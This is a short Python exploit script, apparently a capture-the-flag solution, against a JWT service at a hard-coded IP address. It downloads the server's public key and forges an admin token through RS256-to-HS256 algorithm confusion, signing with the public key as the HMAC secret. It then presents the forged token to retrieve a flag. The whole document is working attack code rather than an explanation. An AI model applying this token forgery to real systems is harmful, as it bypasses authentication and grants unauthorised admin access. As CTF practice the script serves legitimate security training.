import requests
import base64
import json
import hmac
import hashlib

TARGET = "http://110.42.47.58:33453/"

# 1. 直接获取原始公钥 PEM
resp = requests.get(f"{TARGET}/public.pem")
print(resp.text)
public_pem = resp.content
print(f"[+] Got public key PEM ({len(public_pem)} bytes)")

# 2. 手动构造伪造的 admin JWT（HS256 + 公钥PEM作为HMAC密钥）
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "HS256", "typ": "JWT", "kid": "key-2025"}).encode()
).rstrip(b'=')

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin"}).encode()
).rstrip(b'=')

msg = header + b'.' + payload
sig = base64.urlsafe_b64encode(
    hmac.new(public_pem, msg, hashlib.sha256).digest()
).rstrip(b'=')

fake_token = (msg + b'.' + sig).decode('ascii')
print(f"[+] Forged JWT: {fake_token}")

# 3. 发送请求获取 flag
headers = {"Authorization": f"Bearer {fake_token}"}
flag_resp = requests.get(f"{TARGET}/flag", headers=headers)
print(flag_resp.text)